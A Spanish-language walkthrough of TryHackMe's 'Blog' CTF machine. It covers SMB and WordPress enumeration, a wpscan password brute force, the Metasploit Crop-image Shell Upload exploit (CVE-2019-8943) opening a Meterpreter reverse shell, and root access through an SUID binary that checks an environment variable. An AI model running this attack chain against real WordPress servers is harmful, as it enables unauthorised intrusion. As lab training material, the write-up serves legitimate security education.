---
title: Blog Writeup - TryHackMe
date: 2023-06-15
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Medium, WordPress, CVE-2019-8943, SUID]
img_path: /assets/img/commons/blog/
image: blog.png
---

¡Saludos!

En este writeup, nos adentraremos en la máquina [**Blog**](https://tryhackme.com/room/blog) de **TryHackMe**, clasificada con un nivel de dificultad media según la plataforma. Se trata de una máquina **Linux** en la que llevaremos a cabo una enumeración de los servicios **SMB** y **Web**. En este último, identificaremos que nos enfrentamos a un **CMS WordPress**, por lo que utilizaremos la herramienta **wpscan** para realizar una **enumeración de usuarios**. Luego, procederemos a realizar fuerza bruta para identificar una posible contraseña y ganar acceso al panel de login.

Una vez dentro del dashboard, identificaremos la versión de WordPress y encontraremos la vulnerabilidad **Crop-image Shell Upload** asociada a esa versión, lo que nos permitirá ganar acceso al sistema mediante un módulo de **Metasploit**. Por último, escalaremos privilegios abusando de un binario con permisos **SUID**.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.94.113
PING 10.10.94.113 (10.10.94.113) 56(84) bytes of data.
64 bytes from 10.10.94.113: icmp_seq=1 ttl=61 time=272 ms

--- 10.10.94.113 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 272.212/272.212/272.212/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 2000 10.10.94.113 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:16 -05
Nmap scan report for 10.10.94.113
Host is up (0.28s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 34.14 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80,139,445 -sV -sC --min-rate 2000 10.10.94.113 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:17 -05
Nmap scan report for 10.10.94.113
Host is up (0.27s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-06-16T01:17:41+00:00
| smb2-time: 
|   date: 2023-06-16T01:17:41
|_  start_date: N/A
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```

El reporte nos muestra que en la máquina víctima hay un servicio **SSH** (`OpenSSH 7.6p1`), **HTTP** (`Apache httpd 2.4.29`) y **SMB**.

### SMB - 139/445

Comenzamos realizando una enumeración del servicio SMB y, a continuación, procedemos a listar los recursos compartidos utilizando la herramienta **smbmap**.

```bash
❯ smbmap -H 10.10.94.113
[+] Guest session   	IP: 10.10.94.113:445	Name: 10.10.94.113                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	BillySMB                                          	READ, WRITE	Billy's local SMB Share
	IPC$                                              	NO ACCESS	IPC Service (blog server (Samba, Ubuntu))
```

Observamos que en el recurso compartido "**BillySMB**" tenemos permisos de lectura y escritura.

```bash
❯ smbmap -r BillySMB -H 10.10.94.113
[+] Guest session   	IP: 10.10.94.113:445	Name: 10.10.94.113                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	BillySMB                                          	READ, WRITE	
	.\BillySMB\*
	dr--r--r--                0 Thu Jun 15 20:47:59 2023	.
	dr--r--r--                0 Tue May 26 12:58:23 2020	..
	fr--r--r--            33378 Tue May 26 13:17:01 2020	Alice-White-Rabbit.jpg
	fr--r--r--          1236733 Tue May 26 13:13:45 2020	tswift.mp4
	fr--r--r--             3082 Tue May 26 13:13:43 2020	check-this.png
```

Procedemos a explorar el contenido del recurso y notamos la presencia de varias imágenes y un video.

Realizamos una descarga recursiva del contenido del recurso compartido para examinarlos en la máquina local.

```bash
❯ smbget -R smb://10.10.94.113//BillySMB
Password for [root] connecting to //10.10.94.113/BillySMB: 
Using workgroup WORKGROUP, user root
smb://10.10.94.113//BillySMB/Alice-White-Rabbit.jpg                                                                                                                                   
smb://10.10.94.113//BillySMB/tswift.mp4                                                                                                                                               
smb://10.10.94.113//BillySMB/check-this.png                                                                                                                                           
Downloaded 1,21MB in 32 seconds
```

A continuación, utilizamos la herramienta de esteganografía **Steghide** para verificar si encontramos datos ocultos en las imágenes y videos descargados.

```bash
❯ steghide info Alice-White-Rabbit.jpg
"Alice-White-Rabbit.jpg":
  formato: jpeg
  capacidad: 1,8 KB
Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "rabbit_hole.txt":
    tamao: 48,0 Byte
    encriptado: rijndael-128, cbc
    compactado: si
❯ steghide extract -sf Alice-White-Rabbit.jpg
Anotar salvoconducto: 
anot los datos extrados e/"rabbit_hole.txt".
❯ cat rabbit_hole.txt
You've found yourself in a rabbit hole, friend.
```

Al percatarnos de que se trata de un callejón sin salida (rabbit hole), decidimos cambiar de enfoque y realizar una enumeración del servicio web.

### HTTP - 80

Al acceder al servicio web, nos encontramos con la siguiente página que no carga correctamente sus recursos.

En la parte inferior, podemos observar que se está intentando conectar al dominio "**blog.thm**".

![web](web.png)

Procedemos a agregar una entrada en el archivo `/etc/hosts` de nuestra máquina local para apuntar el dominio "**blog.thm**" a la dirección IP de la máquina víctima. 

```bash
❯ echo '10.10.84.224\tblog.thm' >> /etc/hosts
```

Podemos recargar la página nuevamente y esta vez los recursos cargan correctamente.

![web2](web2.png)

Procedemos a ejecutar el comando "**whatweb**" para identificar las tecnologías que emplea el servidor web y obtener información relevante sobre la configuración y posibles vulnerabilidades.

```bash
❯ whatweb http://10.10.84.224/
http://10.10.84.224/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.84.224], MetaGenerator[WordPress 5.0], PoweredBy[-wordpress,-wordpress,,WordPress,WordPress,], Script[text/javascript], Title[Billy Joel&#039;s IT Blog &#8211; The IT blog], UncommonHeaders[link], WordPress[5.0]
```

El resultado revela que estamos ante un WordPress 5.0. Al examinar el archivo robots.txt, encontramos la entrada "`/wp-admin/`" deshabilitada.

![robots](robots.png)

Ahora que hemos confirmado que se trata de un sitio web WordPress, intentamos acceder al panel de inicio de sesión (`/wp-admin/`) para autenticarnos y obtener acceso utilizando credenciales predeterminadas. Sin embargo, nuestros intentos no tuvieron éxito.

![login](login.png)

## Explotación

---

Podemos hacer uso de la herramienta "**wpscan**" para realizar una enumeración exhaustiva del sitio web WordPress en busca de plugins y temas vulnerables, así como posibles usuarios con vulnerabilidades de seguridad.

```bash
❯ wpscan --url http://10.10.84.224/ -e vp,vt,u

[...]

[+] XML-RPC seems to be enabled: http://10.10.84.224/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[...]

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <========================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.84.224/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.84.224/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[...]
```

Tras obtener los resultados de la enumeración, descubrimos la existencia de varios usuarios. Luego, realizamos un proceso de fuerza bruta utilizando el usuario "**kwheel**" y conseguimos obtener credenciales válidas.

```bash
❯ wpscan --url http://10.10.84.224/ -U kwheel -P /usr/share/wordlists/rockyou.txt

[...]

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                                                                                        
Trying kwheel / westham Time: 00:05:41 <                                                                                                     > (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1

[...]
```

Dado que hemos obtenido credenciales válidas, procedemos a utilizarlas para acceder al panel de inicio de sesión de WordPress.

![dashboard](dashboard.png)

### Crop-image Shell Upload (CVE-2019-8943)

Ya que conocemos la versión de WordPress, utilizamos la herramienta "**searchsploit**" para buscar posibles vulnerabilidades relacionadas con esa versión específica.

```bash
❯ searchsploit WordPress 5.0
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                             | php/webapps/51042.txt
WordPress 5.0.0 - Image Remote Code Execution                                                                                                       | php/webapps/49512.py
WordPress Core 5.0 - Remote Code Execution                                                                                                          | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                                                         | php/remote/46662.rb

[...]
```

El resultado revela una vulnerabilidad denominada "**Crop-image Shell Upload**", la cual puede ser explotada utilizando Metasploit. A continuación, procedemos a ejecutar Metasploit y buscar el módulo necesario para aprovechar esta vulnerabilidad.

```bash
❯ msfconsole -q
msf6 > search WordPress 5.0

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce                    2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec       2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2  auxiliary/scanner/http/wp_registrationmagic_sqli  2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi

Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/wp_registrationmagic_sqli
```

Realizamos la ejecución del comando "`use 0`" para utilizar el módulo "`exploit/multi/http/wp_crop_rce`". A continuación, utilizamos el comando "`options`" para visualizar las opciones que debemos configurar.

```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.221.140  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   WordPress

View the full module info with the info, or info -d command.
```

Para explotar la vulnerabilidad correctamente, es necesario configurar las siguientes opciones:

1. **PASSWORD**: Especifica la contraseña del usuario que será utilizada para acceder al sistema objetivo.
2. **RHOSTS**: Representa la dirección IP de la máquina destino (Remote Hosts). 
3. **USERNAME**: Indica el nombre de usuario que se utilizará para autenticarse en el sistema objetivo.
4. **LHOST**: La dirección IP de la máquina atacante (Local Host). 

```bash
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS 10.10.84.224
RHOSTS => 10.10.84.224
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.2.11.100
LHOST => 10.2.11.100
```

Una vez que hayamos configurado las opciones necesarias, procedemos a ejecutar el comando "`exploit`" para dar inicio al ataque.

```bash
msf6 exploit(multi/http/wp_crop_rce) > exploit 

[*] Started reverse TCP handler on 10.2.11.100:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.84.224
[*] Meterpreter session 1 opened (10.2.11.100:4444 -> 10.10.84.224:49774) at 2023-06-15 22:41:34 -0500
[*] Attempting to clean up files...

meterpreter > getuid 
Server username: www-data
```

Después de realizar el ataque con éxito, hemos obtenido una sesión Meterpreter. A continuación, ejecutamos el comando "`shell`" para obtener una shell convencional.

```bash
meterpreter > shell
Process 1760 created.
Channel 1 created.
whoami
www-data
```

Luego ejecutamos el comando `script /dev/null -c bash` para iniciar una nueva sesión de bash con un terminal virtual (pty). 

Observamos que en el directorio `/home` se encuentra el directorio principal del usuario "**bjoel**".

```bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@blog:/var/www/wordpress$ cd /home
cd /home
www-data@blog:/home$ ls
ls
bjoel
```

Intentamos acceder a él y nos encontramos con la primera flag, pero al leerla se nos indica que aquí no encontraremos lo que buscamos.

```bash
www-data@blog:/home$ cd bjoel
cd bjoel
www-data@blog:/home/bjoel$ ls
ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

Así que a continuación empleamos el comando "`find / -name user.txt -type f 2>/dev/null`" para buscar el archivo.

Una vez identificado, procedemos a leerlo.

```bash
root@blog:/home/bjoel# find / -name user.txt -type f 2>/dev/null
find / -name user.txt -type f 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/home/bjoel# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7****************
```

## Escalación de privilegios

---

El siguiente objetivo es identificar un vector de ataque para escalar a privilegios root. Si enumeramos los binarios con permisos **SUID**, obtenemos lo siguiente:

```bash
www-data@blog:/home/bjoel$ find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
```

### Abuso de binario “**checker”** con permisos SUDO

Podemos identificar el binario "`checker`" sospechoso, así que lo ejecutamos para observar su comportamiento.

```bash
www-data@blog:/home/bjoel$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
```

Al ejecutarlo, se imprime "Not an Admin" en la consola. 

Procedemos a ejecutar "`ltrace`", que es una utilidad que permite rastrear las llamadas a funciones de bibliotecas que realiza un proceso.

```bash
www-data@blog:/home/bjoel$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

Del resultado podemos afirmar que el programa `checker` llama a la función `getenv` para obtener el valor de la variable de entorno `admin`, pero esta variable no está definida. Luego, el programa llama a la función `puts` para imprimir el mensaje “Not an Admin” en la salida estándar.

Parece que el programa está comprobando si se define la variable de entorno `admin` para determinar si somos administradores. 

Por lo tanto, procedimos a exportar la variable de entorno `admin` y ejecutamos nuevamente el programa.

```bash
www-data@blog:/home/bjoel$ export admin=pwnd
export admin=pwnd
www-data@blog:/home/bjoel$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/home/bjoel# whoami
whoami
root
```

Después de ejecutar el programa, obtenemos una shell como usuario root. Finalmente, accedemos al directorio `/root` y leemos la última flag.

```bash
root@blog:/home/bjoel# cd /root
cd /root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa****************
```

!Happy Hacking¡
